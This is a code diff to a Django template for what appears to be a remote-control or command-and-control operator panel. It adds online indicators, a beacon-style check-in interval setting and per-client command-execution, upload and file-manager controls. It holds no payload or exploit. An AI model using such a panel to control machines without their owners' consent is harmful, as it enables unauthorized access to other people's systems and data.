@@ -25,7 +25,13 @@
             Clients Name
         </h1>
         {% for client in clients %}
-        	<button id="btn{{ client.id }}" onclick="clientSelector('{{ client.id_name }}')"><i class="fi fi-rr-devices"></i> {{ client.id_name | upper }}</button>
+        	<button id="btn{{ client.id }}" onclick="clientSelector('{{ client.id_name }}')"><i class="fi fi-rr-devices"></i> {{ client.id_name | upper }}
+            {% if client.last_online < 300 %}
+            	🟢
+                {% else %}
+                🔴
+            {% endif %}
+            </button>
         {% endfor %}
     </div>
     <div id="cmd-form">
@@ -42,33 +48,37 @@
         </div>
 
         <div id="overview-content">
-            <div id="status">
+            <div id="status" class="ovw">
                 <i class="fi fi-rr-wifi"></i>
                 <h3>Status</h3>
                 <p>Online</p>
             </div>
-            <div id="username">
+            <div id="username" class="ovw">
                 <i class="fi fi-rr-user"></i>
                 <h3>Username</h3>
                 <p>username</p>
             </div>
-            <div id="ip-address">
+            <div id="ip-address" class="ovw">
                 <i class="fi fi-rr-ip-address"></i>
                 <h3>IP Address</h3>
                 <p>ip address</p>
             </div>
-            <div id="domain">
+            <div id="domain" class="ovw">
                 <i class="fi fi-rr-network-analytic"></i>
-                <h3>Domain</h3>
+                <h3>Hostname</h3>
                 <p>domain</p>
             </div>
-            <div id="last-seen">
+            <div id="last-seen" class="ovw">
                 <i class="fi fi-rr-clock"></i>
                 <h3>Last Seen</h3>
                 <p>20 min</p>
             </div>
+            <div id="interval" class="ovw">
+                <i class="fi fi-rr-pending"></i>
+                <h3>Interval</h3>
+                <p>5 min</p>
+            </div>
         </div>
-
     </div>
     <div id="cmd-exec">
         <div id="cmd-exec-header">
@@ -86,6 +96,17 @@
                 <input type="text" name="upload_cmd" class="upload-cmd" placeholder="upload command here...">
                 <input type="file" name="file" id="file-input" class="file-input">
                 <input type="submit" value="Upload" id="upload-submit" class="upload-submit" name="upload_btn">
+            </form>
+        </div>
+    </div>
+    <div id="interval-modal" class="modal">
+        <div class="modal-content">
+            <span class="close" onclick="closeInterval()">&times;</span>
+            <h1 id="interval-header">Change Interval</h1>
+            <form method="post" id="interval-form" enctype="multipart/form-data">
+                {% csrf_token %}
+                <input type="text" name="interval_input" class="upload-cmd" placeholder="new interval in minute ...">
+                <input type="submit" value="Change" id="interval-submit" class="upload-submit" name="interval_btn">
             </form>
         </div>
     </div>
@@ -141,7 +162,8 @@
         <button onclick="overviewViewer()" id="overview-btn"> <i class="fi fi-rr-ballot"></i>overview</button>
         <button onclick="cmdExecViewer()"  id="cmd-exec-btn"> <i class="fi fi-rr-command"></i>cmd exec</button>
         <button onclick="uploadModalViewer()" id="upload-btn" disabled><i class="fi fi-rr-cloud-upload"></i>upload</button>
-        <button onclick="fileManagerView()" id="file-manager-btn"><i class="fi fi-rr-folder-minus"></i>file manager</button>
+        <button onclick="fileManagerViewer()" id="file-manager-btn"><i class="fi fi-rr-folder-minus"></i>file manager</button>
+        <button onclick="intervalViewer()" id="change-interval-btn" disabled><i class="fi fi-rr-pending"></i>change interval</button>
         </div>
     </div>
 </div>
@@ -186,6 +208,7 @@
         cmd_inputs.forEach(input => input.removeAttribute("disabled"));
         document.getElementById("cmd-submit").value = `Send to ${client.toUpperCase()}`;
         document.getElementById('upload-btn').removeAttribute('disabled');
+        document.getElementById("change-interval-btn").removeAttribute('disabled');
         overviewViewer()
     }
 
@@ -236,6 +259,7 @@
         let ip_address = document.getElementById('ip-address');
         let domain = document.getElementById('domain');
         let last_seen = document.getElementById('last-seen');
+        let interval = document.getElementById('interval');
 
         document.getElementById('overview-header').style.color = '#D0D0D0';
 
@@ -280,11 +304,18 @@
             ip_address.querySelector('p').innerHTML = 'no ip address';
         }
 
+        interval.style.display = 'flex';
+        if (jsonData[client].interval) {
+            interval.querySelector('p').innerHTML = jsonData[client].interval;
+        } else {
+            interval.querySelector('p').innerHTML = 'no interval';
+        }
+
         domain.style.display = 'flex';
         if (jsonData[client].domain) {
             domain.querySelector('p').innerHTML = jsonData[client].domain;
         } else {
-            domain.querySelector('p').innerHTML = 'no domain';
+            domain.querySelector('p').innerHTML = 'no hostname';
         }
 
         last_seen.style.display = 'flex';
@@ -370,7 +401,7 @@
     }
 
     function uploadModalViewer() {
-        client = document.getElementById('func-header-client').innerText;
+        let client = document.getElementById('func-header-client').innerText;
         let upload = document.getElementById('upload');
         upload.style.display = 'flex';
         upload.querySelector('h1').innerHTML = `Upload for ${client}`;
@@ -381,7 +412,20 @@
         document.getElementById('upload').style.display = 'none';
     }
 
-    function fileManagerView() {
+    function intervalViewer() {
+        let client = document.getElementById('func-header-client').innerText;
+        let interval = document.getElementById('interval-modal');
+        interval.style.display = 'flex';
+        let header = document.getElementById("interval-header");
+        header.innerText = 'Change interval of ' + client;
+        document.getElementById('interval-submit').value = `Change for ${client}`;
+    }
+
+    function closeInterval() {
+        document.getElementById('interval-modal').style.display = 'none';
+    }
+
+    function fileManagerViewer() {
         let client = document.getElementById('func-header-client').innerHTML;
 
         if (!jsonData[client]) {
@@ -431,8 +475,11 @@
 
     window.onclick = function (event) {
         let modal = document.getElementById('upload');
+        let interval = document.getElementById('interval-modal');
         if (event.target === modal) {
             modal.style.display = 'none';
+        } else if (event.target === interval) {
+            interval.style.display = 'none';
         }
     }
 </script>
